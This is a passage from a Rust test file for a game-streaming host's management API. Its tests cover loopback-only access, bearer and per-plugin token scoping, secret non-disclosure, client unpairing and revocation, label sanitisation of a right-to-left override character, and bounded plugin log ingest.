    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["native_paired_clients"], 1);
    assert_eq!(body["pending_approvals"], 0);
    assert!(body["version"].is_string());
    let raw = body.to_string();
    assert!(
        !raw.contains("deadbeefcafe0123") && !raw.contains("secret-device-name"),
        "summary must not leak fingerprints or device names: {raw}"
    );

    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("192.168.1.50:40000".parse().unwrap()));
    let (status, _) = send(&app, req).await;
    assert_eq!(
        status,
        StatusCode::UNAUTHORIZED,
        "the local summary must be rejected for a LAN peer"
    );

    let mut req = get_req("/api/v1/local/summary");
    req.extensions_mut()
        .insert(PeerAddr("[::1]:40000".parse().unwrap()));
    let (status, _) = send(&app, req).await;
    assert_eq!(status, StatusCode::OK, "::1 is a loopback peer");
}

#[tokio::test]
async fn bearer_token_is_enforced() {
    let app = test_app(test_state(), Some("sekrit"));

    let (status, body) = send(&app, get_req("/api/v1/status")).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert!(body["error"].as_str().unwrap().contains("bearer"));
    let wrong = axum::http::Request::get("/api/v1/status")
        .header("authorization", "Bearer nope")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, wrong).await.0, StatusCode::UNAUTHORIZED);

    let right = axum::http::Request::get("/api/v1/status")
        .header("authorization", "Bearer sekrit")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, right).await.0, StatusCode::OK);

    assert_eq!(
        send(&app, get_req("/api/v1/health")).await.0,
        StatusCode::OK
    );
    assert_eq!(
        send(&app, get_req("/api/v1/openapi.json")).await.0,
        StatusCode::OK
    );
    let docs = app.clone().oneshot(get_req("/api/docs")).await.unwrap();
    assert_eq!(docs.status(), StatusCode::OK);
    let html = docs.into_body().collect().await.unwrap().to_bytes();
    assert!(
        html.starts_with(b"<!doctype html>"),
        "Scalar UI should serve HTML"
    );
}

#[tokio::test]
async fn plugin_token_lane_is_scoped_and_loopback_only() {
    use axum::http::Method;
    let app = test_app(test_state(), None);

    let plugin_req = |method: Method, path: &str| {
        axum::http::Request::builder()
            .method(method)
            .uri(path)
            .header("authorization", "Bearer plugin-secret")
            .body(Body::empty())
            .unwrap()
    };

    assert_eq!(
        send(&app, plugin_req(Method::GET, "/api/v1/status"))
            .await
            .0,
        StatusCode::OK
    );
    assert_eq!(
        send(&app, plugin_req(Method::GET, "/api/v1/plugins"))
            .await
            .0,
        StatusCode::OK
    );
    assert_eq!(
        send(
            &app,
            plugin_req(Method::DELETE, "/api/v1/plugins/no-such-plugin")
        )
        .await
        .0,
        StatusCode::NO_CONTENT
    );

    // The runner's only token (Windows LocalService cannot read the admin one). Pin ingest
    // here; do not rely on `plugin_may_access` continuing not to match `/plugins/logs`.
    let body = serde_json::json!({"entries": [{
        "ts_ms": 1_700_000_000_000u64,
        "level": "INFO",
        "source": "virtualhere",
        "msg": "hello from the runner",
    }]});
    let req = axum::http::Request::post("/api/v1/plugins/logs")
        .header("content-type", "application/json")
        .header("authorization", "Bearer plugin-secret")
        .body(Body::from(body.to_string()))
        .unwrap();
    assert_eq!(send(&app, req).await.0, StatusCode::NO_CONTENT);

    // Carve-outs are 403 (authenticated but not authorized), not 401.
    #[cfg_attr(not(feature = "gamestream"), allow(unused_mut))]
    let mut carveouts = vec![
        (Method::GET, "/api/v1/hooks"),
        (Method::PUT, "/api/v1/hooks"),
        (Method::POST, "/api/v1/native/pair/arm"),
        (Method::GET, "/api/v1/native/pending"),
        (Method::DELETE, "/api/v1/clients/aabbcc"),
        (Method::GET, "/api/v1/plugins/x/ui-credential"),
        (Method::GET, "/api/v1/store/catalog"),
        (Method::POST, "/api/v1/store/install"),
        (Method::POST, "/api/v1/store/uninstall"),
        (Method::POST, "/api/v1/store/runtime"),
        (Method::PUT, "/api/v1/store/sources/evil"),
    ];
    // PIN route exists only in GameStream-featured builds.
    #[cfg(feature = "gamestream")]
    carveouts.push((Method::GET, "/api/v1/pair"));
    for (method, path) in carveouts {
        let (status, body) = send(&app, plugin_req(method.clone(), path)).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{method} {path}");
        assert!(body["error"].as_str().unwrap().contains("plugin token"));
    }

    let wrong = axum::http::Request::get("/api/v1/status")
        .header("authorization", "Bearer plugin-wrong")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, wrong).await.0, StatusCode::UNAUTHORIZED);

    // LAN peer is refused before token compare, same as the admin token.
    let mut lan = plugin_req(Method::GET, "/api/v1/status");
    lan.extensions_mut()
        .insert(PeerAddr("192.168.1.50:40000".parse().unwrap()));
    assert_eq!(send(&app, lan).await.0, StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn host_info_reports_identity_and_ports() {
    let app = test_app(test_state(), None);
    let (status, body) = send(&app, get_req("/api/v1/host")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["hostname"], "test-host");
    assert_eq!(body["uniqueid"], "deadbeef");
    // `os` is the icon-walk chain; `os_name` is the human label. Both copied from Host.
    assert_eq!(body["os"], "linux/arch/steamos");
    assert_eq!(body["os_name"], "SteamOS");
    assert_eq!(body["ports"]["http"], HTTP_PORT);
    assert_eq!(body["ports"]["mgmt"], DEFAULT_PORT);
    // Assert against `host_wire_caps`, not a fixed set. HEVC serializes as "hevc", never "h265".
    use punktfunk_core::quic::{CODEC_AV1, CODEC_H264, CODEC_HEVC, CODEC_PYROWAVE};
    let caps = crate::encode::host_wire_caps();
    let expected: Vec<&str> = [
        (CODEC_H264, "h264"),
        (CODEC_HEVC, "hevc"),
        (CODEC_AV1, "av1"),
        (CODEC_PYROWAVE, "pyrowave"),
    ]
    .into_iter()
    .filter(|(bit, _)| caps & bit != 0)
    .map(|(_, name)| name)
    .collect();
    assert_eq!(body["codecs"], serde_json::json!(expected));
    assert!(caps & CODEC_H264 != 0, "H.264 is always encodable");
    assert_eq!(body["gamestream"], false);
}

/// A device sent a connect link has to be able to check what it reached, so the host publishes
/// its own leaf fingerprint. Public by construction — every client reads it off the handshake.
#[tokio::test]
async fn host_info_publishes_the_hosts_own_fingerprint() {
    let stats = test_stats();
    let state = test_state();
    let app = crate::mgmt::app(
        state,
        Some("test-secret".to_string()),
        Some("plugin-secret".to_string()),
        shared_plugin_tokens(test_plugin_tokens()),
        DEFAULT_PORT,
        None,
        stats,
        test_client_logs_dir(),
        test_access_dir(),
        false,
        Some([0xab; 32]),
        false,
    );
    let (status, body) = send(&app, get_req("/api/v1/host")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["fingerprint"], "ab".repeat(32));

    // An identity that could not be parsed says so rather than publishing a wrong pin.
    let app = test_app(test_state(), None);
    let (_, body) = send(&app, get_req("/api/v1/host")).await;
    assert!(body["fingerprint"].is_null());
}

#[tokio::test]
async fn compositors_lists_all_backends_with_flags() {
    let app = test_app(test_state(), None);
    let (status, body) = send(&app, get_req("/api/v1/compositors")).await;
    assert_eq!(status, StatusCode::OK);
    let arr = body.as_array().expect("array");
    // Compositors are Linux-only; elsewhere the list is empty so the console can say N/A.
    #[cfg(not(target_os = "linux"))]
    assert!(arr.is_empty(), "non-Linux hosts advertise no compositors");
    #[cfg(target_os = "linux")]
    {
        let ids: Vec<&str> = arr.iter().map(|c| c["id"].as_str().unwrap()).collect();
        assert_eq!(ids, ["kwin", "gamescope", "mutter", "wlroots", "hyprland"]);
    }
    for c in arr {
        assert!(c["available"].is_boolean());
        assert!(c["default"].is_boolean());
        assert!(c["label"].as_str().is_some_and(|s| !s.is_empty()));
    }
    // At most one auto-detect default; none if the test env has no desktop.
    assert!(arr.iter().filter(|c| c["default"] == true).count() <= 1);
}

#[tokio::test]
async fn status_reflects_runtime_state() {
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let state = test_state();
    let app = test_app(state.clone(), None);

    let (_, body) = send(&app, get_req("/api/v1/status")).await;
    assert_eq!(body["video_streaming"], false);
    assert_eq!(body["session"], serde_json::Value::Null);

    *state.launch.lock().unwrap() = Some(LaunchSession {
        gcm_key: [0; 16],
        rikeyid: 1,
        width: 2560,
        height: 1440,
        fps: 120,
        appid: 1,
        peer_ip: None,
        owner_fp: None,
    });
    state.streaming.store(true, Ordering::SeqCst);

    let (_, body) = send(&app, get_req("/api/v1/status")).await;
    assert_eq!(body["video_streaming"], true);
    assert_eq!(body["session"]["width"], 2560);
    assert_eq!(body["session"]["fps"], 120);
    assert!(!body.to_string().contains("gcm"));
}

/// Overrides `PUNKTFUNK_CONFIG_DIR` for one test and restores it on drop, even on panic.
///
/// One helper for the whole file: `check-unsafe-hygiene.sh` greps this file for a fixed
/// count of `set_var` sites (and prose mentions). The lock is a field so Drop restores
/// the env while still holding it — fields drop after `Drop::drop`.
struct ConfigDirOverride {
    tmp: tempfile::TempDir,
    prev: Option<std::ffi::OsString>,
    _serial: std::sync::MutexGuard<'static, ()>,
}

impl ConfigDirOverride {
    fn new() -> ConfigDirOverride {
        let _serial = crate::identity::CONFIG_DIR_TEST_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let tmp = tempfile::tempdir().unwrap();
        let prev = std::env::var_os("PUNKTFUNK_CONFIG_DIR");
        // SAFETY: `_serial` holds CONFIG_DIR_TEST_LOCK, which serializes every test in this binary
        // that reads or writes this variable.
        unsafe { std::env::set_var("PUNKTFUNK_CONFIG_DIR", tmp.path()) };
        ConfigDirOverride { tmp, prev, _serial }
    }

    /// Config dir used verbatim by `pf_paths`; no `punktfunk` subdirectory is appended.
    fn path(&self) -> &std::path::Path {
        self.tmp.path()
    }
}

impl Drop for ConfigDirOverride {
    fn drop(&mut self) {
        match self.prev.take() {
            // SAFETY: `self._serial` is still alive here (fields drop after `Drop::drop`), so this
            // runs under the same serialization as the `set_var` in `new`.
            Some(v) => unsafe { std::env::set_var("PUNKTFUNK_CONFIG_DIR", v) },
            // SAFETY: as above.
            None => unsafe { std::env::remove_var("PUNKTFUNK_CONFIG_DIR") },
        }
    }
}

// The env override must cover the whole body. `#[tokio::test]` is single-threaded, so
// nothing else needs the executor while we hold `CONFIG_DIR_TEST_LOCK`.
#[allow(clippy::await_holding_lock)]
#[tokio::test]
async fn paired_clients_list_and_unpair() {
    // Unpair writes paired.json; the override keeps this off the real config dir.
    let tmp = ConfigDirOverride::new();

    let state = test_state();
    let app = test_app(state.clone(), None);

    // Native ephemeral identity (CN "punktfunk") so both build flavors share a stand-in cert.
    let stand_in = crate::identity::ephemeral().unwrap();
    let (_, pem) = x509_parser::pem::parse_x509_pem(stand_in.cert_pem.as_bytes()).unwrap();
    let der = pem.contents.clone();
    let fingerprint = hex::encode(Sha256::digest(&der));
    // `AppState::new` loads paired.json; clear before seeding so a real pairing never lands at [0].
    {
        let mut p = state.paired.lock().unwrap();
        p.clear();
        // Cloned, not moved: the unpair-all section at the end of this test re-seeds it.
        p.push(der.clone());
    }

    let (status, body) = send(&app, get_req("/api/v1/clients")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body[0]["fingerprint"], fingerprint);
    assert_eq!(body[0]["subject"], "CN=punktfunk");

    let bad = axum::http::Request::delete("/api/v1/clients/zz")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, bad).await.0, StatusCode::BAD_REQUEST);

    // Unpair is revocation: it must end this client's live session, not only delist the cert.
    {
        use std::sync::atomic::Ordering;
        // owner_fp is the sha256 of the cert DER — the bytes `fingerprint` encodes.
        let mut owner = [0u8; 32];
        owner.copy_from_slice(&hex::decode(&fingerprint).unwrap());
        state.streaming.store(true, Ordering::SeqCst);
        *state.launch.lock().unwrap() = Some(LaunchSession {
            gcm_key: [0; 16],
            rikeyid: 0,
            width: 1920,
            height: 1080,
            fps: 60,
            appid: 1,
            peer_ip: None,
            owner_fp: Some(owner),
        });
    }

    // Path is case-insensitive; uppercase hex must match too.
    let del = |fp: String| {
        axum::http::Request::delete(format!("/api/v1/clients/{fp}"))
            .body(Body::empty())
            .unwrap()
    };
    assert_eq!(
        send(&app, del(fingerprint.to_uppercase())).await.0,
        StatusCode::NO_CONTENT
    );
    {
        use std::sync::atomic::Ordering;
        assert!(
            state.launch.lock().unwrap().is_none(),
            "unpair must end the revoked client's live session"
        );
        assert!(!state.streaming.load(Ordering::SeqCst));
        assert!(
            state.quit.load(Ordering::SeqCst),
            "the teardown is deliberate (quit), not a drop"
        );
    }
    let (_, body) = send(&app, get_req("/api/v1/clients")).await;
    assert_eq!(body, serde_json::json!([]));
    assert_eq!(send(&app, del(fingerprint)).await.0, StatusCode::NOT_FOUND);

    // Restart must not resurrect the pairing (that re-opens the control port).
    // `PUNKTFUNK_CONFIG_DIR` is used verbatim — no `punktfunk` subdirectory.
    let disk = std::fs::read(tmp.path().join("paired.json")).expect("unpair persisted paired.json");
    assert_eq!(
        serde_json::from_slice::<Vec<Vec<u8>>>(&disk).unwrap(),
        Vec::<Vec<u8>>::new()
    );

    // Re-seed two clients and clear teardown flags so bulk-delete's session effect is not leftover.
    let second = crate::identity::ephemeral().unwrap();
    let (_, second_pem) = x509_parser::pem::parse_x509_pem(second.cert_pem.as_bytes()).unwrap();
    let second_der = second_pem.contents.clone();
    let second_fp = hex::encode(Sha256::digest(&second_der));
    {
        use std::sync::atomic::Ordering;
        let mut p = state.paired.lock().unwrap();
        p.clear();
        p.push(der.clone());
        p.push(second_der);
        state.quit.store(false, Ordering::SeqCst);
        state.streaming.store(true, Ordering::SeqCst);
        // Session owned by the second client — bulk delete must end whichever revoked cert owns it.
        let mut owner = [0u8; 32];
        owner.copy_from_slice(&hex::decode(&second_fp).unwrap());
        *state.launch.lock().unwrap() = Some(LaunchSession {
            gcm_key: [0; 16],
            rikeyid: 0,
            width: 1920,
            height: 1080,
            fps: 60,
            appid: 1,
            peer_ip: None,
            owner_fp: Some(owner),
        });
    }

    let del_all = || {
        axum::http::Request::delete("/api/v1/clients")
            .body(Body::empty())
            .unwrap()
    };
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 2, "both clients must be reported removed");

    let (_, body) = send(&app, get_req("/api/v1/clients")).await;
    assert_eq!(body, serde_json::json!([]));
    {
        use std::sync::atomic::Ordering;
        assert!(
            state.launch.lock().unwrap().is_none(),
            "unpair-all must end the live session of any client it revokes"
        );
        assert!(state.quit.load(Ordering::SeqCst));
    }
    // Same persist check: a resurrected pairing would re-open the control port.
    let disk = std::fs::read(tmp.path().join("paired.json")).unwrap();
    assert_eq!(
        serde_json::from_slice::<Vec<Vec<u8>>>(&disk).unwrap(),
        Vec::<Vec<u8>>::new()
    );

    // Emptying an empty store is 200 with count 0, not the single-delete's 404.
    let (status, body) = send(&app, del_all()).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["unpaired"], 0);
}

/// Moonlight certs share a subject; the label is the only distinction in the console, so
/// a silent no-op rename is indistinguishable from picking the other device.
#[allow(clippy::await_holding_lock)]
#[tokio::test]
async fn client_label_round_trips_scrubs_and_is_forgotten_on_unpair() {
    let tmp = ConfigDirOverride::new();

    let state = test_state();
    let app = test_app(state.clone(), None);
    let stand_in = crate::identity::ephemeral().unwrap();
    let (_, pem) = x509_parser::pem::parse_x509_pem(stand_in.cert_pem.as_bytes()).unwrap();
    let der = pem.contents.clone();
    let fingerprint = hex::encode(Sha256::digest(&der));
    {
        let mut p = state.paired.lock().unwrap();
        p.clear();
        p.push(der.clone());
    }

    let patch = |fp: String, body: serde_json::Value| {
        axum::http::Request::patch(format!("/api/v1/clients/{fp}"))
            .header("content-type", "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    // Unnamed: the field is absent, not an empty string.
    let (_, body) = send(&app, get_req("/api/v1/clients")).await;
    assert!(body[0]["label"].is_null());

    // Path is case-insensitive; uppercase fingerprint must match too.
    let (status, body) = send(
        &app,
        patch(
            fingerprint.to_uppercase(),
            serde_json::json!({ "label": "Living Room TV" }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["label"], "Living Room TV");
    let (_, body) = send(&app, get_req("/api/v1/clients")).await;
    assert_eq!(body[0]["label"], "Living Room TV");

    // Bidi override could impersonate another device in the unpair list; whitespace collapse keeps one line.
    // `\u{202E}` is RIGHT-TO-LEFT OVERRIDE.
    let (_, body) = send(
        &app,
        patch(
            fingerprint.clone(),
            serde_json::json!({ "label": "  Deck\u{202E}evil\n\nx  " }),
        ),
    )
    .await;
    assert_eq!(body["label"], "Deckevil x");

    // Whitespace-only must clear, not store "   " or the sanitizer's "device <fp8>" fallback.
    let (_, body) = send(
        &app,
        patch(fingerprint.clone(), serde_json::json!({ "label": "   " })),
    )
    .await;
    assert!(body["label"].is_null());

    send(
        &app,
        patch(
            fingerprint.clone(),
            serde_json::json!({ "label": "Bedroom" }),
        ),
    )
    .await;
    let (_, body) = send(
        &app,
        patch(fingerprint.clone(), serde_json::json!({ "label": null })),
    )
    .await;
    assert!(body["label"].is_null());

    // Malformed → 400; unknown-but-well-formed → 404 (must not write a label nothing can clean up).
    assert_eq!(
        send(
            &app,
            patch("zz".into(), serde_json::json!({ "label": "x" }))
        )
        .await
        .0,
        StatusCode::BAD_REQUEST
    );
    assert_eq!(
        send(
            &app,
            patch("aa".repeat(32), serde_json::json!({ "label": "x" }))
        )
        .await
        .0,
        StatusCode::NOT_FOUND
    );

    // Unpair must forget the label so a later re-pair of the same cert does not inherit it.
    send(
        &app,
        patch(
            fingerprint.clone(),
            serde_json::json!({ "label": "Living Room TV" }),
        ),
    )
    .await;
    let del = axum::http::Request::delete(format!("/api/v1/clients/{fingerprint}"))
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    let on_disk: std::collections::BTreeMap<String, String> =
        std::fs::read(tmp.path().join("client-labels.json"))
            .ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
            .unwrap_or_default();
    assert!(
        !on_disk.contains_key(&fingerprint),
        "unpair must forget the device's label, got {on_disk:?}"
    );
}

#[cfg(feature = "gamestream")]
#[tokio::test]
async fn submit_pin_validates_and_requires_pending_pairing() {
    let app = test_app(test_state(), None);
    let post = |body: &str| {
        axum::http::Request::post("/api/v1/pair/pin")
            .header("content-type", "application/json")
            .body(Body::from(body.to_string()))
            .unwrap()
    };

    let body = |pin: &str| {
        format!(
            r#"{{"pin":"{pin}","uniqueid":"dev","fingerprint":"{}","peer_ip":"127.0.0.1"}}"#,
            "aa".repeat(32)
        )
    };
    assert_eq!(send(&app, post(&body(""))).await.0, StatusCode::BAD_REQUEST);
    assert_eq!(
        send(&app, post(&body("12ab"))).await.0,
        StatusCode::BAD_REQUEST
    );
    assert_eq!(
        send(&app, post(&body("1234"))).await.0,
        StatusCode::CONFLICT
    );

    // axum body rejections must still wear the ApiError envelope.
    let (status, body) = send(&app, post("{not json")).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(body["error"].is_string(), "syntax error: {body}");
    let (status, body) = send(&app, post(r#"{"wrong":"shape"}"#)).await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY);
    assert!(body["error"].is_string(), "schema mismatch: {body}");
    let no_ct = axum::http::Request::post("/api/v1/pair/pin")
        .body(Body::from(r#"{"pin":"1234"}"#))
        .unwrap();
    let (status, body) = send(&app, no_ct).await;
    assert_eq!(status, StatusCode::UNSUPPORTED_MEDIA_TYPE);
    assert!(body["error"].is_string(), "media type: {body}");
}

/// The hole per-plugin tokens close: with one shared token, any plugin could overwrite another's
/// registration — and then answer for its tiles. A plugin that proved which plugin it is may
/// write its own id and nothing else.
#[tokio::test]
async fn a_plugin_may_write_only_its_own_id() {
    let app = test_app(test_state(), None);
    let put = |id: &str, token: &str| {
        axum::http::Request::builder()
            .method("PUT")
            .uri(format!("/api/v1/plugins/{id}"))
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(
                serde_json::json!({ "title": "Demo" }).to_string(),
            ))
            .unwrap()
    };
    // Its own id: accepted.
    let (status, _) = send(&app, put("demo", "demo-secret")).await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    // Another plugin's: refused, whatever the payload says.
    let (status, body) = send(&app, put("rom-manager", "demo-secret")).await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    // Deregistering someone else is the same question.
    let (status, _) = send(
        &app,
        axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/v1/plugins/rom-manager")
            .header("authorization", "Bearer demo-secret")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
}

/// Authentication reads the shared map on every request, so a store job can publish a token
/// before restarting the runner without rebuilding the management router.
#[tokio::test]
async fn a_refreshed_plugin_token_takes_effect_live() {
    let state = test_state();
    let stats = state.stats.clone();
    let tokens = shared_plugin_tokens(std::collections::BTreeMap::from([(
        "demo".to_string(),
        "old-secret".to_string(),
    )]));
    let app = app(
        state,
        Some("test-secret".to_string()),
        Some("plugin-secret".to_string()),
        tokens.clone(),
        DEFAULT_PORT,
        None,
        stats,
        test_client_logs_dir(),
        test_access_dir(),
        false,
        None,
        false,
    );
    *tokens
        .write()
        .unwrap_or_else(|poisoned| poisoned.into_inner()) =
        std::collections::BTreeMap::from([("demo".to_string(), "new-secret".to_string())]);
    let put = |token: &str| {
        axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/plugins/demo")
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {token}"))
            .body(Body::from(r#"{"title":"Demo"}"#))
            .unwrap()
    };
    assert_eq!(
        send(&app, put("old-secret")).await.0,
        StatusCode::UNAUTHORIZED
    );
    assert_eq!(
        send(&app, put("new-secret")).await.0,
        StatusCode::NO_CONTENT
    );
}

/// `plugins add` mints in another process: a token only the file knows authenticates, as that
/// plugin, on its first request.
#[tokio::test]
async fn a_token_minted_by_another_process_authenticates() {
    let dir = tempfile::tempdir().unwrap();
    let run = dir.path().join(crate::plugins::RUNNER_DATA_DIR);
    std::fs::create_dir_all(&run).unwrap();
    std::fs::write(run.join("plugin-tokens.json"), r#"{"fresh":"cli-secret"}"#).unwrap();
    let app = test_app_access(test_state(), dir.path());
    let put = |id: &str| {
        axum::http::Request::builder()
            .method("PUT")
            .uri(format!("/api/v1/plugins/{id}"))
            .header("content-type", "application/json")
            .header("authorization", "Bearer cli-secret")
            .body(Body::from(r#"{"title":"Fresh"}"#))
            .unwrap()
    };
    assert_eq!(send(&app, put("fresh")).await.0, StatusCode::NO_CONTENT);
    assert_eq!(send(&app, put("demo")).await.0, StatusCode::FORBIDDEN);
}

/// Same rule on the library side: a provider's entries belong to the plugin that owns the id.
#[tokio::test]
async fn a_plugin_may_reconcile_only_its_own_provider() {
    let app = test_app(test_state(), None);
    let (status, body) = send(
        &app,
        axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/library/provider/steam")
            .header("content-type", "application/json")
            .header("authorization", "Bearer demo-secret")
            .body(Body::from("[]"))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    let (status, _) = send(
        &app,
        axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/v1/library/provider/steam")
            .header("authorization", "Bearer demo-secret")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);
}

/// The runner's shared token keeps the older, unowned behaviour — a loose script has no plugin
/// identity to check — so upgrading a host does not strand one.
#[tokio::test]
async fn the_shared_runner_token_stays_unowned() {
    let app = test_app(test_state(), None);
    let (status, _) = send(
        &app,
        axum::http::Request::builder()
            .method("PUT")
            .uri("/api/v1/plugins/anything")
            .header("content-type", "application/json")
            .header("authorization", "Bearer plugin-secret")
            .body(Body::from(
                serde_json::json!({ "title": "Demo" }).to_string(),
            ))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
}

/// A blank token is no token: `run` refuses to start unauthenticated, even on loopback.
#[tokio::test]
async fn blank_token_rejected() {
    let opts = Options {
        bind: "127.0.0.1:0".parse().unwrap(),
        token: Some("   ".into()),
        plugin_token: None,
        ..Default::default()
    };
    let err = run(
        test_state(),
        opts,
        None,
        test_stats(),
        false,
        crate::identity::ephemeral().unwrap(),
        false,
    )
    .await
    .unwrap_err();
    assert!(err.to_string().contains("no token"), "{err}");
}

#[tokio::test]
async fn stop_session_clears_runtime_state() {
    // This route quits every live native session, a sibling test's included.
    let _registry = crate::session_status::tests::REGISTRY.lock().await;
    let state = test_state();
    let app = test_app(state.clone(), None);
    state.streaming.store(true, Ordering::SeqCst);
    state.audio_streaming.store(true, Ordering::SeqCst);
    *state.launch.lock().unwrap() = Some(LaunchSession {
        gcm_key: [0; 16],
        rikeyid: 0,
        width: 1920,
        height: 1080,
        fps: 60,
        appid: 1,
        peer_ip: None,
        owner_fp: None,
    });

    let del = axum::http::Request::delete("/api/v1/session")
        .body(Body::empty())
        .unwrap();
    assert_eq!(send(&app, del).await.0, StatusCode::NO_CONTENT);
    assert!(!state.streaming.load(Ordering::SeqCst));
    assert!(!state.audio_streaming.load(Ordering::SeqCst));
    assert!(state.launch.lock().unwrap().is_none());
}

#[tokio::test]
async fn idr_requires_an_active_stream() {
    // A sibling test's live native session would look like an active stream to this route.
    let _serial = crate::session_status::tests::REGISTRY.lock().await;
    let state = test_state();
    let app = test_app(state.clone(), None);
    let post = || {
        axum::http::Request::post("/api/v1/session/idr")
            .body(Body::empty())
            .unwrap()
    };
    assert_eq!(send(&app, post()).await.0, StatusCode::CONFLICT);

    state.streaming.store(true, Ordering::SeqCst);
    assert_eq!(send(&app, post()).await.0, StatusCode::ACCEPTED);
    assert!(state.force_idr.load(Ordering::SeqCst));
}

/// Register → list (no secret) → credential (secret) → deregister. The listing must never
/// carry the UI secret.
#[tokio::test]
async fn plugin_registry_roundtrip() {
    let app = test_app(test_state(), None);
    let id = "test-plugin-roundtrip";
    let secret = "s3cr3t-abcdefghijkl"; // 19 chars, valid [A-Za-z0-9_-]

    let (status, _) = send(
        &app,
        put_json(
            &format!("/api/v1/plugins/{id}"),
            serde_json::json!({
                "title": "Test Plugin",
                "ui": { "port": 49321, "secret": secret, "icon": "gamepad-2" }
            }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, body) = send(&app, get_req("/api/v1/plugins")).await;
    assert_eq!(status, StatusCode::OK);
    let mine = body
        .as_array()
        .unwrap()
        .iter()
        .find(|p| p["id"] == id)
        .expect("registered plugin is listed");
    assert_eq!(mine["title"], "Test Plugin");
    assert_eq!(mine["ui"]["port"], 49321);
    assert_eq!(mine["ui"]["icon"], "gamepad-2");
    assert!(
        !body.to_string().contains(secret),
        "the listing must never carry the UI secret"
    );

    let (status, body) = send(
        &app,
        get_req(&format!("/api/v1/plugins/{id}/ui-credential")),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["secret"], secret);
    assert_eq!(body["port"], 49321);

    let (status, _) = send(
        &app,
        axum::http::Request::delete(format!("/api/v1/plugins/{id}"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);
    let (_, body) = send(&app, get_req("/api/v1/plugins")).await;
    assert!(
        body.as_array().unwrap().iter().all(|p| p["id"] != id),
        "deregistered plugin must not list"
    );
    let (status, _) = send(
        &app,
        get_req(&format!("/api/v1/plugins/{id}/ui-credential")),
    )
    .await;
    assert_eq!(status, StatusCode::NOT_FOUND);

    // Port 80 is privileged; registration must 400.
    let (status, _) = send(
        &app,
        put_json(
            &format!("/api/v1/plugins/{id}"),
            serde_json::json!({ "title": "x", "ui": { "port": 80, "secret": secret } }),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// Ingest lands on the same ring `GET /logs` serves, tagged for the console filter.
/// One request must not be able to evict the ring.
#[tokio::test]
async fn plugin_log_ingest_lands_in_the_ring() {
    let app = test_app(test_state(), None);
    let marker = "vh-ingest-marker-3f9a";

    let (status, _) = send(
        &app,
        post_json(
            "/api/v1/plugins/logs",
            serde_json::json!({"entries": [
                {"ts_ms": 1_700_000_000_123u64, "level": "warn", "source": "virtualhere", "msg": marker},
                // Empty source is attributed to the runner, not to nothing.
                {"ts_ms": 1_700_000_000_124u64, "level": "NOTICE", "source": "", "msg": "orphan"},
            ]}),
        ),
    )
    .await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    let (status, body) = send(&app, get_req("/api/v1/logs?limit=1000")).await;
    assert_eq!(status, StatusCode::OK);
    let entries = body["entries"].as_array().unwrap();

    let mine = entries
        .iter()
        .find(|e| e["msg"] == marker)
        .expect("ingested line is served by GET /logs");
    // `plugin:` is the console Host/Plugins filter key.
    assert_eq!(mine["target"], "plugin:virtualhere");
    // Lowercase in, canonical out; the console ranks these five levels only.
    assert_eq!(mine["level"], "WARN");
    // Stamped when the line happened, not when the batch arrived.
    assert_eq!(mine["ts_ms"], 1_700_000_000_123u64);

    let orphan = entries.iter().find(|e| e["msg"] == "orphan").unwrap();
    assert_eq!(orphan["target"], "plugin:runner");
    // Unranked levels would sort as 0 and hide under every console filter setting.
    assert_eq!(orphan["level"], "INFO");

    // Oversized batch is refused whole, not half-ingested.
    let big: Vec<serde_json::Value> = (0..300)
        .map(|i| serde_json::json!({"ts_ms": 1u64, "level": "INFO", "source": "x", "msg": format!("f{i}")}))
        .collect();
    let (status, _) = send(
        &app,
        post_json("/api/v1/plugins/logs", serde_json::json!({"entries": big})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

/// The plugin lane may hit the library write routes, but `prep` and a `command` launch
/// execute as the host user (`/bin/sh -c` / `cmd.exe /c`). Those fields are operator-only.
#[tokio::test]
